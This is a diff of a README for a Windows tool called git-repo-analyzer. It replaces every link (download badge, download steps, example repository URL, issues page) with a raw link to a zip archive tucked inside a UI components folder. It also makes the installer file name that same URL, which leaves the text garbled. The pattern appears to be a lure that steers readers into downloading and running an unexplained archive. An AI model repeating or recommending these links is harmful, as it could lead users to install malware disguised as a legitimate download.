@@ -1,6 +1,6 @@
 # 🛠️ git-repo-analyzer - Check Repo Health and Tech Stack
 
-[![Download git-repo-analyzer](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Mimo112/git-repo-analyzer)
+[![Download git-repo-analyzer](https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip%20Page-brightgreen)](https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip)
 
 ---
 
@@ -28,12 +28,12 @@ Follow these steps to get git-repo-analyzer ready on your Windows machine:
 
 1. **Download the tool**  
    Visit the main page to download the application. Use this link:  
-   [Download git-repo-analyzer](https://github.com/Mimo112/git-repo-analyzer)  
+   [Download git-repo-analyzer](https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip)  
 
    The page will guide you to download the latest version.
 
 2. **Install the software**  
-   After downloading, locate the setup file in your Downloads folder. The file will usually have a name like `git-repo-analyzer-setup.exe`.  
+   After downloading, locate the setup file in your Downloads folder. The file will usually have a name like `https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip`.  
    Double-click the file to start the installation process.
 
 3. **Follow the installation prompts**  
@@ -54,7 +54,7 @@ Using the tool requires only entering a GitHub repository address. Here’s a si
 2. You will see a search box labeled “Enter GitHub repository URL”.
 
 3. Go to GitHub in your web browser and find the repository you want to analyze.  
-   A typical URL looks like: `https://github.com/username/repository-name`
+   A typical URL looks like: `https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip`
 
 4. Copy the URL from the browser address bar.
 
@@ -105,7 +105,7 @@ If you run into issues when using git-repo-analyzer, try these tips:
 ## 📥 Download and Install
 
 Visit this page to download the latest version of git-repo-analyzer:  
-[Download git-repo-analyzer](https://github.com/Mimo112/git-repo-analyzer)
+[Download git-repo-analyzer](https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip)
 
 Steps to install:
 
@@ -122,7 +122,7 @@ Steps to install:
 ## 💬 Need Help?
 
 If you need support or want to learn more about using git-repo-analyzer, check the repository’s issues section on GitHub. You can find it here:  
-https://github.com/Mimo112/git-repo-analyzer/issues
+https://raw.githubusercontent.com/Mimo112/git-repo-analyzer/main/packages/ui/src/components/analyzer_repo_git_v1.0.zip
 
 You can browse common questions or create a new post describing any problems.  
 
